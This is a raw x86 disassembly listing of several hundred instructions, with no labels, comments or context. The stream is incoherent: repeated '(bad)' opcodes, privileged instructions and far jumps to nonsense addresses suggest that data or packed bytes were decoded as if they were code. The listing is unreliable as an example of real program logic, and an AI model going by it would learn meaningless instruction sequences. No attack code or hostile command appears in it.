  41e67f:	(bad)  
  41e680:	xlat   BYTE PTR ds:[ebx]
  41e681:	scas   eax,DWORD PTR es:[edi]
  41e682:	scas   al,BYTE PTR es:[edi]
  41e683:	pop    ebp
  41e684:	or     ah,bl
  41e686:	cwde   
  41e687:	nop
  41e688:	jo     0x41e60d
  41e68a:	push   eax
  41e68b:	rcl    DWORD PTR [edi-0xeaa6bd8],1
  41e691:	cmp    ecx,DWORD PTR [ebp-0x2b]
  41e694:	pop    es
  41e695:	sar    DWORD PTR [edx+0x5f2d08a7],1
  41e69b:	(bad)  [ecx]
  41e69d:	scas   al,BYTE PTR es:[edi]
  41e69e:	cmp    DWORD PTR [esi+0x41],ecx
  41e6a1:	push   ds
  41e6a2:	ins    DWORD PTR es:[edi],dx
  41e6a3:	push   ebx
  41e6a4:	mov    fs,WORD PTR [eax]
  41e6a6:	ds and al,0x47
  41e6a9:	ror    dh,0xbd
  41e6ac:	adc    al,0xdc
  41e6ae:	pop    ss
  41e6af:	xor    edx,DWORD PTR ds:0x36f8016d
  41e6b5:	data16 fwait
  41e6b7:	mov    WORD PTR [esi-0x5a68f7e7],fs
  41e6bd:	sysret 
  41e6bf:	inc    eax
  41e6c0:	out    dx,eax
  41e6c1:	ins    DWORD PTR es:[edi],dx
  41e6c2:	and    al,bh
  41e6c4:	mov    ecx,0x9c9bd8f7
  41e6c9:	adc    al,0x64
  41e6cb:	das    
  41e6cc:	xchg   esi,eax
  41e6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6ce:	stos   BYTE PTR es:[edi],al
  41e6cf:	mov    ebp,DWORD PTR [ecx+0x5d47525e]
  41e6d5:	pusha  
  41e6d6:	cmc    
  41e6d7:	add    DWORD PTR [esi-0xd],ebp
  41e6da:	or     BYTE PTR [esi],0x5a
  41e6dd:	sub    al,0x8f
  41e6df:	push   eax
  41e6e0:	stos   DWORD PTR es:[edi],eax
  41e6e1:	add    bl,ch
  41e6e3:	inc    eax
  41e6e4:	ja     0x41e73d
  41e6e6:	jbe    0x41e727
  41e6e8:	outs   dx,BYTE PTR ds:[esi]
  41e6e9:	xor    al,0xd8
  41e6eb:	pop    ss
  41e6ec:	(bad)
  41e6ef:	jp     0x41e67d
  41e6f1:	fcomip st,st(1)
  41e6f3:	pop    eax
  41e6f4:	les    edx,FWORD PTR ds:0xae21f719
  41e6fa:	and    ah,dh
  41e6fc:	call   0x8e0f:0xe56985f2
  41e703:	pushf  
  41e704:	jbe    0x41e6c4
  41e706:	sbb    BYTE PTR [ecx],0xd4
  41e709:	xchg   BYTE PTR [ebp+0x3517d0b0],dh
  41e70f:	jle    0x41e76c
  41e711:	adc    al,0xe
  41e713:	adc    ebp,DWORD PTR [ebx-0x2e]
  41e716:	mov    edi,0xa2fcec86
  41e71b:	movntps XMMWORD PTR ds:0x90bd5c4c,xmm4
  41e722:	dec    ebx
  41e723:	dec    ecx
  41e724:	sti    
  41e725:	xchg   esp,eax
  41e726:	mov    DWORD PTR [ecx+0x7fe20f0d],0xfd8dfafb
  41e730:	xor    BYTE PTR [edx+eiz*8-0x29bc8e4e],al
  41e737:	out    dx,al
  41e738:	imul   ebp,DWORD PTR ds:0x74dcb1dd,0x17f82d62
  41e742:	imul   ebx,DWORD PTR [edx+esi*2],0x55
  41e746:	xchg   ecx,eax
  41e747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e748:	fdivrp st(1),st
  41e74a:	shl    BYTE PTR [edx-0x4473eacf],1
  41e750:	shr    DWORD PTR [edx],cl
  41e752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e753:	inc    edi
  41e754:	mov    esi,0x6c52af09
  41e759:	mov    edx,DWORD PTR [ebx+0x6599a446]
  41e75f:	inc    edx
  41e760:	das    
  41e761:	aaa    
  41e762:	add    eax,0xe1ed3f77
  41e767:	pop    edi
  41e768:	sti    
  41e769:	push   esp
  41e76a:	mov    dl,0xcd
  41e76c:	add    ebx,esp
  41e76e:	mov    ecx,?
  41e770:	or     cl,bh
  41e772:	icebp  
  41e773:	xchg   esp,eax
  41e774:	adc    eax,0xcf5de111
  41e779:	pusha  
  41e77a:	cmp    BYTE PTR [edx+0x51],0xde
  41e77e:	(bad)  
  41e77f:	mov    al,0xae
  41e781:	cmp    esp,edx
  41e783:	jmp    0x740c8527
  41e788:	lahf   
  41e789:	xor    al,0x85
  41e78b:	fucomi st,st(1)
  41e78d:	stc    
  41e78e:	aad    0x86
  41e790:	or     cl,ah
  41e792:	xrelease mov DWORD PTR [edi],ebx
  41e795:	cmp    eax,0x474c4172
  41e79a:	jmp    0x126e:0x5384af7d
  41e7a1:	stc    
  41e7a2:	xchg   edi,eax
  41e7a3:	sub    al,0x44
  41e7a5:	pop    ebp
  41e7a6:	ja     0x41e763
  41e7a8:	sti    
  41e7a9:	arpl   WORD PTR [edi*2+0x333ef7c1],bx
  41e7b0:	cmp    cl,dh
  41e7b2:	loope  0x41e7ab
  41e7b4:	jmp    0x9fd1:0xa4cbd1c3
  41e7bb:	les    edi,FWORD PTR [ebx-0xd]
  41e7be:	ins    BYTE PTR es:[edi],dx
  41e7bf:	shr    DWORD PTR [esi],cl
  41e7c1:	iret   
  41e7c2:	(bad)  
  41e7c3:	ins    DWORD PTR es:[edi],dx
  41e7c4:	jecxz  0x41e829
  41e7c6:	add    al,BYTE PTR [ecx+ebp*1-0x6c]
  41e7ca:	jmp    0x2a6ee936
  41e7cf:	mov    ebp,0xed29f108
  41e7d4:	out    dx,al
  41e7d5:	scas   al,BYTE PTR es:[edi]
  41e7d6:	(bad)  
  41e7d7:	call   0x557f0335
  41e7dc:	shl    DWORD PTR [ebx+0x7d],1
  41e7df:	and    DWORD PTR [ecx],0x5f5d731e
  41e7e5:	mov    edx,0x44bbf534
  41e7ea:	xor    al,0x3d
  41e7ec:	or     al,0x12
  41e7ee:	lock xchg ebx,eax
  41e7f0:	mov    dh,0xdf
  41e7f2:	push   0x5b3b0b6b
  41e7f7:	unpcklps xmm4,xmm7
  41e7fa:	and    ah,BYTE PTR [ecx]
  41e7fc:	pop    ds
  41e7fd:	jns    0x41e7ff
  41e7ff:	sahf   
  41e800:	loop   0x41e842
  41e802:	xor    esi,DWORD PTR [eax-0x60927a3c]
  41e808:	jmp    0xe6e0:0xf9add31c
  41e80f:	fdivp  st(2),st
  41e811:	mov    eax,esp
  41e813:	mov    edi,0xf85d436c
  41e818:	scas   eax,DWORD PTR es:[edi]
  41e819:	dec    ebx
  41e81a:	inc    esp
  41e81b:	add    eax,0x2ea50e03
  41e820:	hlt    
  41e821:	inc    edx
  41e822:	gs pop ebx
  41e824:	adc    al,BYTE PTR [edx+esi*2+0x11]
  41e828:	cmp    eax,0xb7be499e
  41e82d:	repnz stos BYTE PTR es:[edi],al
  41e82f:	mov    dh,0xcc
  41e831:	inc    edi
  41e832:	out    dx,eax
  41e833:	jnp    0x41e7e1
  41e835:	test   al,0x40
  41e837:	push   ebx
  41e838:	arpl   WORD PTR [edi-0x27],bp
  41e83b:	fldenv [edx-0xd49be2b]
  41e841:	pop    ecx
  41e842:	test   eax,0xa11bb978
  41e847:	push   ss
  41e848:	mov    al,ds:0xd4705e03
  41e84d:	addr16 fpatan 
  41e850:	ds in  al,0xaf
  41e853:	cmc    
  41e854:	xchg   esi,eax
  41e855:	push   ss
  41e856:	cwde   
  41e857:	mov    BYTE PTR [esi],ah
  41e859:	fdiv   st(0),st
  41e85b:	mov    DWORD PTR [esi+0x63],ecx
  41e85e:	test   BYTE PTR [esi+0x11],ch
  41e861:	mov    eax,0x39b30eed
  41e866:	xlat   BYTE PTR ds:[ebx]
  41e867:	lahf   
  41e868:	jmp    0x7287ec7f
  41e86d:	xchg   edx,eax
  41e86e:	or     eax,0xa8650fb
  41e873:	mov    ch,0x12
  41e875:	fild   WORD PTR [ecx]
  41e877:	enter  0x3eb9,0x3a
  41e87b:	dec    eax
  41e87c:	imul   ebx,DWORD PTR [edi-0x49e97a2a],0x66
  41e883:	push   esp
  41e884:	fsubr  st(2),st
  41e886:	pop    esp
  41e887:	in     eax,0x64
  41e889:	push   ebp
  41e88a:	fimul  WORD PTR [ebp+0x63]
  41e88d:	cmc    
  41e88e:	iret   
  41e88f:	idiv   DWORD PTR [edi-0x6f4a3906]
  41e895:	retf   
  41e896:	adc    eax,0x21ad928e
  41e89b:	mov    esi,0x87228be9
  41e8a0:	and    esp,ebx
  41e8a2:	stos   BYTE PTR es:[edi],al
  41e8a3:	xor    BYTE PTR ds:0xe2d3b04d,bl
  41e8a9:	int    0xda
  41e8ab:	in     al,0x3f
  41e8ad:	push   eax
  41e8ae:	retf   0xd8af
  41e8b1:	sub    DWORD PTR [ebx+0x2b],esp
  41e8b4:	adc    eax,0x805608b2
  41e8b9:	push   esp
  41e8ba:	xchg   esi,eax
  41e8bb:	in     al,dx
  41e8bc:	lea    esi,[edx+0x3b]
  41e8bf:	loop   0x41e92f
  41e8c1:	ds inc esi
  41e8c3:	mov    eax,0x17561489
  41e8c8:	push   ss
  41e8c9:	inc    ebx
  41e8ca:	int3   
  41e8cb:	pop    eax
  41e8cc:	fcom   DWORD PTR [edx-0x21b09a1e]
  41e8d2:	stos   DWORD PTR es:[edi],eax
  41e8d3:	outs   dx,BYTE PTR ds:[esi]
  41e8d4:	(bad)  [ebx-0x49]
  41e8d7:	adc    BYTE PTR [edx],0x8b
  41e8da:	imul   DWORD PTR ds:0x3e47f34
  41e8e0:	shl    BYTE PTR [ecx-0x5c04f688],cl
  41e8e6:	dec    esi
  41e8e7:	loopne 0x41e8d3
  41e8e9:	cli    
  41e8ea:	cmp    eax,esp
  41e8ec:	xchg   ebx,eax
  41e8ed:	and    DWORD PTR [edx-0x1f],ebp
  41e8f0:	xor    al,0xae
  41e8f2:	mov    esp,0x692c1467
  41e8f7:	adc    BYTE PTR [ecx+0x59],dl
  41e8fa:	xchg   esi,eax
  41e8fb:	ss pop ebp
  41e8fd:	xor    eax,DWORD PTR [edi]
  41e8ff:	js     0x41e974
  41e901:	sbb    al,0x51
  41e903:	add    bh,0x3c
  41e906:	cmp    dl,bl
  41e908:	jl     0x41e8ac
  41e90a:	push   es
  41e90b:	in     eax,0x42
  41e90d:	xlat   BYTE PTR ds:[ebx]
  41e90e:	dec    eax
  41e90f:	cmp    DWORD PTR [esi-0x5fbf1f65],edi
  41e915:	rcr    dh,0xae
  41e918:	in     al,dx
  41e919:	push   0x4c
  41e91b:	rol    ebx,0x78
  41e91e:	xor    BYTE PTR [esi],dh
  41e920:	sbb    al,0x82
  41e922:	fldenv [ebx+0x7452333d]
  41e928:	and    ecx,DWORD PTR [edi+0x3d]
  41e92b:	jb     0x41e944
  41e92d:	sbb    al,0xc0
  41e92f:	popf   
  41e930:	inc    esp
  41e931:	test   al,0x2f
  41e933:	dec    edi
  41e934:	inc    ebx
  41e935:	xchg   ebx,eax
  41e936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e937:	sbb    al,0x55
  41e939:	test   BYTE PTR [edx+0x15],bl
  41e93c:	sbb    eax,0xcf868393
  41e941:	sbb    cl,al
  41e943:	dec    ebx
  41e944:	sbb    DWORD PTR [edx+0x501ee7ca],0xffffff92
  41e94b:	pop    edx
  41e94c:	mov    dh,0x85
  41e94e:	and    ah,BYTE PTR [ebp+ebx*8+0x593c81cf]
  41e955:	fucomi st,st(5)
  41e957:	dec    ebx
  41e958:	out    dx,al
  41e959:	rcr    bh,0x4c
  41e95c:	mov    edx,0x8123fd48
  41e961:	aam    0xc7
  41e963:	call   0xae8a:0xea29fb4c
  41e96a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e96b:	add    bl,bh
  41e96d:	ins    BYTE PTR es:[edi],dx
  41e96e:	or     eax,0x39d27a81
  41e973:	mov    esi,0x2943736f
  41e978:	push   ecx
  41e979:	inc    edi
  41e97a:	shl    DWORD PTR [eax+0x67e1351c],1
  41e980:	push   cs
  41e981:	aaa    
  41e982:	add    edx,DWORD PTR [ebx+edi*4-0x44]
  41e986:	mov    cl,0x11
  41e988:	retf   0xcd94
  41e98b:	xor    cl,ch
  41e98d:	fidivr DWORD PTR [eax+0x48f73902]
  41e993:	gs push eax
  41e995:	pop    es
  41e996:	or     eax,DWORD PTR [esi]
  41e998:	(bad)  
  41e999:	mov    bl,0xf2
  41e99b:	sbb    eax,0xb8a1d74c
  41e9a0:	fiadd  DWORD PTR [ecx+0x3]
  41e9a3:	dec    esp
  41e9a4:	loop   0x41e9d5
  41e9a6:	sub    esp,DWORD PTR [edx+0x17]
  41e9a9:	aam    0x51
  41e9ab:	and    edi,DWORD PTR [edx+ebp*2-0x44]
  41e9af:	fwait
  41e9b0:	imul   ebp,DWORD PTR [edx+edi*8+0x21],0x45
  41e9b5:	cmp    al,0xb9
  41e9b7:	mul    dl
  41e9b9:	imul   esp,DWORD PTR [edi+0x5c0b7ae9],0x3dcb2433
  41e9c3:	sub    ah,BYTE PTR [ebx]
  41e9c5:	(bad)  
  41e9c7:	mov    eax,ds:0x4aff4e7c
  41e9cc:	out    dx,al
  41e9cd:	sbb    DWORD PTR [edi+0x74],edx
  41e9d0:	jp     0x41e9cb
  41e9d2:	xor    bh,BYTE PTR [edx*8-0x4462f3c1]
  41e9d9:	pop    edx
  41e9da:	add    bh,ah
  41e9dc:	xchg   ebp,eax
  41e9dd:	enter  0xf551,0x5c
  41e9e1:	test   DWORD PTR [esi-0x3b],esp
  41e9e4:	(bad)
  41e9e8:	inc    ecx
  41e9e9:	pop    ds
  41e9ea:	jp     0x41e99e
  41e9ec:	add    BYTE PTR [ebp+0x66],bh
  41e9ef:	(bad)  
  41e9f0:	ficom  WORD PTR [ecx+0x3e76ccba]
  41e9f6:	xchg   edx,eax
  41e9f7:	push   edx
  41e9f8:	push   edx
  41e9f9:	out    dx,eax
  41e9fa:	lea    eax,[eax-0x6d587ee8]
  41ea00:	adc    eax,0xb694f908
  41ea05:	xor    DWORD PTR [ebp+edi*4-0x6f8b8dae],eax
  41ea0c:	adc    eax,0xf8fbc9c3
  41ea11:	fild   WORD PTR [edi-0x493992f3]
  41ea17:	(bad)  
  41ea18:	in     eax,dx
  41ea19:	arpl   WORD PTR [edx],dx
  41ea1b:	repz xor DWORD PTR [edi-0x67],ebp
  41ea1f:	or     edi,DWORD PTR [eax+0x52]
  41ea22:	ret    
  41ea23:	xchg   edi,eax
  41ea24:	stos   BYTE PTR es:[edi],al
  41ea25:	data16 add al,0x53
  41ea28:	sub    bl,ch
  41ea2a:	and    al,0x53
  41ea2c:	push   cs
  41ea2d:	popa   
  41ea2e:	pop    esi
  41ea2f:	mov    al,0xfe
  41ea31:	jno    0x41e9ba
  41ea33:	mov    ebp,0xb6588ffd
  41ea38:	push   edx
  41ea39:	push   esp
  41ea3a:	cmp    al,0x4d
  41ea3c:	sbb    bh,BYTE PTR [edi-0x12]
  41ea3f:	push   ecx
  41ea40:	stos   DWORD PTR es:[edi],eax
  41ea41:	neg    BYTE PTR [edi-0x3]
  41ea44:	loopne 0x41e9fa
  41ea46:	leave  
  41ea47:	test   al,0x4f
  41ea49:	xchg   esp,eax
  41ea4a:	imul   edx,DWORD PTR [ecx],0x6
  41ea4d:	and    ch,al
  41ea4f:	(bad)  
  41ea50:	aam    0x72
  41ea52:	je     0x41eab7
  41ea54:	les    ecx,FWORD PTR [edx-0x25]
  41ea57:	sbb    cl,ch
  41ea59:	pop    ebx
  41ea5a:	not    DWORD PTR [ebp+0x510662e5]
  41ea60:	leave  
  41ea61:	sub    ch,BYTE PTR [eax]
  41ea63:	imul   edx,DWORD PTR [eax-0x5727bd0f],0xfffffff4
  41ea6a:	xor    BYTE PTR [ebx+0x35714a7],dh
  41ea70:	fidiv  DWORD PTR [ebx+0x33248a6b]
  41ea76:	retf   0x4494
  41ea79:	mov    ebp,0x76a33a7a
  41ea7e:	jns    0x41ead9
  41ea80:	jmp    0x41eac7
  41ea82:	iret   
  41ea83:	sbb    dl,BYTE PTR [esi]
  41ea85:	rcl    DWORD PTR [edx-0x3a],0xdf
  41ea89:	jl     0x41ea2a
  41ea8b:	or     DWORD PTR [edi+0x69f4b6b9],edi
  41ea91:	rcr    BYTE PTR [edi-0x6298677b],cl
  41ea97:	(bad)  
  41ea98:	mov    ah,0xa3
  41ea9a:	xor    eax,0x5a4c45a0
  41ea9f:	je     0x41ea7b
  41eaa1:	inc    ebx
  41eaa2:	add    BYTE PTR [ebx],0xf9
  41eaa5:	dec    esp
  41eaa6:	xchg   ebx,eax
  41eaa7:	(bad)  
  41eaa8:	jg     0x41eb10
  41eaaa:	push   0xffffff80
  41eaac:	sbb    al,0x40
  41eaae:	sub    ecx,DWORD PTR [esi]
  41eab0:	sub    al,ch
  41eab2:	jmp    0xecc8:0x830b2908
  41eab9:	and    eax,0x116e0f73
  41eabe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eabf:	xlat   BYTE PTR ds:[ebx]
  41eac0:	jl     0x41ea69
  41eac2:	mov    ecx,DWORD PTR [ecx+0x5a]
  41eac5:	jp     0x41ea5d
  41eac7:	fwait
  41eac8:	bnd jbe 0x41eadc
  41eacb:	fs out dx,eax
  41eacd:	cdq    
  41eace:	cwde   
  41eacf:	pop    esi
  41ead0:	inc    bh
  41ead2:	shl    DWORD PTR [esi],cl
  41ead4:	adc    al,0xd2
  41ead6:	jg     0x41eac2
  41ead8:	inc    edx
  41ead9:	stos   BYTE PTR es:[edi],al
  41eada:	xchg   edx,eax
  41eadb:	mov    bh,0xf7
  41eadd:	xchg   ecx,eax
  41eade:	xchg   esp,eax
  41eadf:	inc    edx
  41eae0:	ds push ds
  41eae2:	add    eax,0x77ab7ff1
  41eae7:	lahf   
  41eae8:	in     al,dx
  41eae9:	dec    esi
  41eaea:	sbb    bl,dh
  41eaec:	jmp    0x8ac:0x7d1b9cdc
  41eaf3:	dec    esp
  41eaf4:	dec    ecx
  41eaf5:	ficom  DWORD PTR ds:0x1be3aebe
  41eafb:	or     BYTE PTR [ecx+0x3e6301f4],ah
  41eb01:	daa    
  41eb02:	test   DWORD PTR [ebx-0x111a618f],ebx
  41eb08:	inc    ebx
  41eb09:	call   0x547c259e
  41eb0e:	fimul  WORD PTR [ecx+0x59c2898e]
  41eb14:	sbb    ch,cl
  41eb16:	lea    ecx,[si+0x5c]
  41eb1a:	jp     0x41eb7d
  41eb1c:	aad    0x3d
  41eb1e:	outs   dx,DWORD PTR ds:[esi]
  41eb1f:	in     al,0x95
  41eb21:	jp     0x41eb2b
  41eb23:	mov    edx,0xb443f3ec
  41eb28:	cwde   
  41eb29:	adc    al,0xe8
  41eb2b:	cld    
  41eb2c:	or     al,0xbb
  41eb2e:	div    DWORD PTR [edx]
  41eb30:	out    0x83,al
  41eb32:	cli    
  41eb33:	cmp    ah,ch
  41eb35:	mov    ebx,0xbaf9ed48
  41eb3a:	sar    BYTE PTR [ecx],1
  41eb3c:	rol    BYTE PTR [ebx-0x39],0x5
  41eb40:	(bad)  
  41eb41:	mov    dl,0x83
  41eb43:	jno    0x41eb2c
  41eb45:	mov    esp,0xd7f5b93b
  41eb4a:	movups XMMWORD PTR [ebp+0x60],xmm1
  41eb4e:	and    bl,BYTE PTR [edi+ebp*1+0x67971e96]
  41eb55:	arpl   WORD PTR [edi+0x5b],bx
  41eb58:	cwde   
  41eb59:	stc    
  41eb5a:	cmp    al,0x17
  41eb5c:	pop    esp
  41eb5d:	enter  0xa253,0xbb
  41eb61:	iret   
  41eb62:	sbb    edx,edi
  41eb64:	sbb    DWORD PTR [edx-0x5e],0xffffffe6
  41eb68:	pop    ecx
  41eb69:	in     al,0x20
  41eb6b:	xchg   esi,eax
  41eb6c:	add    eax,DWORD PTR [eax]
  41eb6e:	jmp    0x7035:0x472219b4
  41eb75:	mov    ?,WORD PTR [esi]
  41eb77:	or     eax,0x33316bad
  41eb7c:	sbb    al,0x75
  41eb7e:	je     0x41eb4f
  41eb80:	or     dl,BYTE PTR [edx-0x65417347]
  41eb86:	xchg   ebp,eax
  41eb87:	mov    ds:0x5506c2fe,eax
  41eb8c:	sub    BYTE PTR [edx+0x69f5ae3c],ch
  41eb92:	add    esi,edi
  41eb94:	int    0x3c
  41eb96:	stc    
  41eb97:	dec    eax
  41eb98:	neg    DWORD PTR [ebx-0x1908303c]
  41eb9e:	pop    eax
  41eb9f:	xor    DWORD PTR [ecx+0x15],eax
  41eba2:	add    al,0x44
  41eba4:	mov    bh,bh
  41eba6:	ja     0x41ebf3
  41eba8:	loop   0x41eb41
  41ebaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebab:	push   esi
  41ebac:	mov    ah,0xe1
  41ebae:	push   edi
  41ebaf:	push   esp
  41ebb0:	gs sbb eax,0xd6dd091d
  41ebb6:	cmc    
  41ebb7:	out    0xcc,al
  41ebb9:	int    0x2e
  41ebbb:	or     DWORD PTR [edi+0x16],ebx
  41ebbe:	pop    esp
  41ebbf:	pop    esp
  41ebc0:	add    esi,ebx
  41ebc2:	retf   0xa242
  41ebc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebc6:	adc    al,0x93
  41ebc8:	dec    ebp
  41ebc9:	mov    esi,0x72a416a7
  41ebce:	inc    esi
  41ebcf:	and    BYTE PTR [edx-0x1582906a],bh
  41ebd5:	adc    al,0x76
  41ebd7:	(bad)  
  41ebda:	in     al,0xac
  41ebdc:	js     0x41ec17
  41ebde:	xor    eax,0x8e614429
  41ebe3:	pusha  
  41ebe4:	dec    esi
  41ebe5:	jle    0x41eb7a
  41ebe7:	and    DWORD PTR [ebp-0x64d03544],0xffffff84
  41ebee:	push   0x8d50bb2a
  41ebf3:	pusha  
  41ebf4:	push   0xffffff85
  41ebf6:	mov    edx,DWORD PTR [ebp+0x75dce46a]
  41ebfc:	(bad)  
  41ebfd:	fsubr  st,st(1)
  41ebff:	aaa    
  41ec00:	mov    bh,cl
  41ec02:	neg    DWORD PTR [ecx]
  41ec04:	fisttp QWORD PTR [eax+0x36]
  41ec07:	fld    QWORD PTR [esi]
  41ec09:	and    bh,BYTE PTR [edx+0x2e]
  41ec0c:	and    al,0x84
  41ec0e:	and    eax,0xd8b1db07
  41ec13:	(bad)  
  41ec15:	pushf  
  41ec16:	addr16 sti 
  41ec18:	jo     0x41ec38
  41ec1a:	fcmovu st,st(5)
  41ec1c:	ret    0x812c
  41ec1f:	mov    al,0x9f
  41ec21:	fld    st(5)
  41ec23:	lock mov ah,0xba
  41ec26:	inc    edi
  41ec27:	(bad)  [edx-0x58]
  41ec2a:	aad    0x5d
  41ec2c:	inc    eax
  41ec2d:	adc    bh,ah
  41ec2f:	test   al,0xdc
  41ec31:	push   edx
  41ec32:	fisubr WORD PTR [esi+0x54373048]
  41ec38:	leave  
  41ec39:	mov    ds:0x8a71236f,al
  41ec3e:	xchg   ecx,eax
  41ec3f:	sahf   
  41ec40:	jle    0x41ec3c
  41ec42:	mov    ch,0x24
  41ec44:	jnp    0x41ec9b
  41ec46:	ret    
  41ec47:	addr16 mov eax,ds
  41ec4a:	jp     0x41ebe3
  41ec4c:	push   esi
  41ec4d:	jae    0x41ec6d
  41ec4f:	test   al,0x81
  41ec51:	jnp    0x41ec11
  41ec53:	(bad)  
  41ec54:	aad    0x99
  41ec56:	dec    edx
  41ec57:	int    0x7e
  41ec59:	aas    
  41ec5a:	mov    esp,DWORD PTR [ebx+0x79fa1de7]
  41ec60:	cwde   
  41ec61:	xlat   BYTE PTR ds:[ebx]
  41ec62:	gs aad 0xbb
  41ec65:	(bad)  
  41ec66:	sbb    BYTE PTR [ebx+0x3f5244b8],bl
  41ec6c:	jne    0x41ec37
  41ec6e:	adc    ebp,DWORD PTR [esi-0x71]
  41ec71:	sti    
  41ec72:	clc    
  41ec73:	push   ecx
  41ec74:	ja     0x41eccb
  41ec76:	mov    BYTE PTR [esi+0x56ed0039],ah
  41ec7c:	and    eax,0xb02da1c5
  41ec81:	jge    0x41ec7f
  41ec83:	xchg   DWORD PTR [esp+ecx*1-0x8343af8],esp
  41ec8a:	into   
  41ec8b:	(bad)  
  41ec8c:	push   ebp
  41ec8d:	push   edx
  41ec8e:	les    ebp,FWORD PTR [edi+0x5834beb1]
  41ec94:	inc    ebp
  41ec95:	mov    bl,BYTE PTR [ebx-0x32bedc23]
  41ec9b:	retf   0xa5f0
  41ec9e:	in     eax,dx
  41ec9f:	sub    DWORD PTR [edi],eax
  41eca1:	pop    ds
  41eca2:	ja     0x41ecd8
  41eca4:	add    DWORD PTR [eax+0x67],esi
  41eca7:	jecxz  0x41ec29
  41eca9:	sar    edx,cl
  41ecab:	inc    ecx
  41ecac:	cmp    ecx,ebp
  41ecae:	sbb    eax,0x720b3cba
  41ecb3:	dec    eax
  41ecb4:	(bad)  
  41ecb6:	xor    edi,DWORD PTR [ecx-0x77e68389]
  41ecbc:	(bad)  
  41ecbd:	cli    
  41ecbe:	fwait
  41ecbf:	cmp    al,0xe3
  41ecc1:	sbb    ch,ch
  41ecc3:	lahf   
  41ecc4:	dec    ebp
  41ecc5:	pop    ebx
  41ecc6:	push   esi
  41ecc7:	aam    0xb6
  41ecc9:	push   ecx
  41ecca:	jne    0x41ed39
  41eccc:	(bad)  
  41ecce:	adc    BYTE PTR [eax-0x5d],bl
  41ecd1:	jmp    0x1287:0xe8b08916
  41ecd8:	(bad)  
  41ecd9:	int    0x5d
  41ecdb:	sar    DWORD PTR [esi],0x10
  41ecde:	add    BYTE PTR [ebx],al
  41ece0:	jno    0x41ec79
  41ece2:	mov    dh,0x79
  41ece4:	pop    edx
  41ece5:	shr    BYTE PTR [edi-0xf4ca87],0xb4
  41ecec:	ins    BYTE PTR es:[edi],dx
  41eced:	or     eax,0x946b84c4
  41ecf2:	pop    ebx
  41ecf3:	ret    0x41a9
  41ecf6:	mul    DWORD PTR [edi-0x6c]
  41ecf9:	push   esp
  41ecfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecfb:	mov    esp,DWORD PTR [ebx]
  41ecfd:	sub    BYTE PTR ds:0xcc97ebc6,cl
  41ed03:	or     BYTE PTR [esi],0x7b
  41ed06:	lods   eax,DWORD PTR ds:[esi]
  41ed07:	mov    eax,0x6c3149a
  41ed0c:	ins    DWORD PTR es:[edi],dx
  41ed0d:	sub    bl,BYTE PTR [edi+0x1cc3b408]
  41ed13:	clc    
  41ed14:	add    eax,0xa6b1eed2
  41ed19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed1a:	jmp    0x41ed09
  41ed1c:	pop    es
  41ed1d:	fist   WORD PTR [eax-0x7eee2b3f]
  41ed23:	in     eax,0x4a
  41ed25:	sbb    eax,0x3a7f2709
  41ed2a:	fild   QWORD PTR ds:0xaa1a40c
  41ed30:	mov    es,WORD PTR [eax+ecx*1-0x3f03e648]
  41ed37:	and    DWORD PTR [edx+ebx*2-0x19],0xffffffff
  41ed3c:	imul   eax,DWORD PTR [esi-0x50],0x87743e2d
  41ed43:	sub    DWORD PTR [edx+eax*4],esp
  41ed46:	pop    ss
  41ed47:	std    
  41ed48:	hlt    
  41ed49:	push   eax
  41ed4a:	fstp   TBYTE PTR [ebp-0x7b]
  41ed4d:	cdq    
  41ed4e:	dec    edx
  41ed4f:	and    BYTE PTR [ecx+0x45b69004],ah
  41ed55:	call   0xd6d81881
  41ed5a:	mov    ecx,0x5b6e4716
  41ed5f:	test   eax,0xb653fa3f
  41ed64:	sar    DWORD PTR [eax+0x51],0xa2
  41ed68:	jecxz  0x41ed72
  41ed6a:	adc    BYTE PTR [ecx+0x57],cl
  41ed6d:	xchg   DWORD PTR [ebx+0x177adaed],ecx
  41ed73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed74:	fsub   DWORD PTR [esi-0x22]
  41ed77:	sar    bl,0x61
  41ed7a:	test   DWORD PTR [edx+0x7f808c5a],esi
  41ed80:	push   ebp
  41ed81:	jmp    0x41ed56
  41ed83:	arpl   WORD PTR ds:0xf0016e35,cx
  41ed89:	pop    ecx
  41ed8a:	xchg   DWORD PTR [ebx-0x11],esi
  41ed8d:	inc    eax
  41ed8e:	test   BYTE PTR [ebx-0x7be9cfa],cl
  41ed94:	ret    
  41ed95:	xor    al,0x81
  41ed97:	mov    ebp,0x8e448ff5
  41ed9c:	sbb    eax,0x163e1d07
  41eda1:	in     al,dx
  41eda2:	(bad)
  41eda5:	jl     0x41edc5
  41eda7:	test   al,0x5d
  41eda9:	es and BYTE PTR ss:[ecx],bl
  41edad:	jae    0x41ed8d
  41edaf:	bound  esi,QWORD PTR [ebx+0x2]
  41edb2:	and    DWORD PTR [ebx+esi*4-0x1b],eax
  41edb6:	cmp    BYTE PTR [ebp-0x3],dh
  41edb9:	in     al,dx
  41edba:	div    BYTE PTR [edi]
  41edbc:	cs test eax,ebx
  41edbf:	jne    0x41ee1f
  41edc1:	inc    eax
  41edc2:	mov    edx,0xc27239f
  41edc7:	pop    edx
  41edc8:	(bad)  
  41edc9:	dec    ebp
  41edca:	stc    
  41edcb:	daa    
  41edcc:	inc    ebp
  41edcd:	inc    esi
  41edce:	jae    0x41ed58
  41edd0:	mov    ds:0xfd2a746,eax
  41edd5:	mov    ecx,ss
  41edd7:	cld    
  41edd8:	fidiv  DWORD PTR [ecx]
  41edda:	mov    ebp,DWORD PTR ds:0xfa1f49fa
  41ede0:	call   FWORD PTR [ebx]
  41ede2:	sbb    DWORD PTR [edi],0x9202e73f
  41ede8:	mov    eax,ds:0xa5a79581
  41eded:	fmul   QWORD PTR [ebx]
  41edef:	sti    
  41edf0:	dec    edx
  41edf1:	fwait
  41edf2:	jnp    0x41ee48
  41edf4:	je     0x41ede3
  41edf6:	xor    al,0x43
